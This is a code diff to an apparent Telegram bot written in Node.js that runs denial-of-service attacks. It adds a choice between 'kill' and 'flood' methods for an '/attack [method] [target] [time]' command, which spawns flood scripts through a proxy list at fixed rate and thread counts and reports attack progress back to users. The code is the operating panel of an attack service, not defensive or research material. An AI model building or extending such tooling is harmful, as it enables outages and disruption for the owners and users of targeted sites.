@@ -115,17 +115,19 @@ bot.on('message', async (msg) => {
 
   if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
-    if (args.length !== 4) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/attack [target] [time] [rate] [thread]' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    if (args.length !== 3) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/attack [method] [target] [time]' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
-    const [target, timeStr, rate, thread] = args
+    const [method, target, timeStr] = args
     const time = parseInt(timeStr)
-    const proxy = './prx.txt'
+    const rate = 20
+    const thread = 10
+    const proxy = './proxy.txt'
 
-    if (!target || isNaN(time) || isNaN(parseInt(rate)) || isNaN(parseInt(thread))) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Invalid arguments' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    if (!['kill', 'flood'].includes(method) || !target || isNaN(time)) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Invalid method or arguments' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
@@ -141,12 +143,14 @@ bot.on('message', async (msg) => {
       return
     }
 
-    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, proxy], { stdio: ['ignore', 'pipe', 'pipe'] })
+    const scriptFile = method === 'kill' ? './kill.js' : './flood.js'
+    const cmd = spawn('node', [scriptFile, target, time, rate, thread, proxy], { stdio: ['ignore', 'pipe', 'pipe'] })
     const attackId = `${userId}_${Date.now()}`
     activeAttacks[attackId] = { cmd, target, time, rate, thread, proxy, userId, remainingTime: time, messageId: null, startTime: Date.now() }
 
     const response = {
       status: 'Attack Started',
+      method,
       target,
       time,
       rate,
@@ -185,6 +189,7 @@ bot.on('message', async (msg) => {
       }
       const updatedResponse = {
         status: 'Attack Running',
+        method,
         target,
         time: activeAttacks[attackId].remainingTime,
         rate,
@@ -215,8 +220,8 @@ bot.on('message', async (msg) => {
     }, 10000)
 
     cmd.stderr.on('data', (data) => {
-      console.error(`kill.js error: ${data}`)
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: `kill.js: ${data}` }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      console.error(`Script error: ${data}`)
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: `${scriptFile}: ${data}` }, null, 2) + '\n```', { parse_mode: 'Markdown' })
     })
 
     cmd.on('error', (err) => {
@@ -244,6 +249,7 @@ bot.on('message', async (msg) => {
       .filter(([_, v]) => isAdmin || v.userId === userId)
       .map(([key, v]) => ({
         index: key,
+        method: v.method,
         target: v.target,
         time: v.remainingTime,
         rate: v.rate,
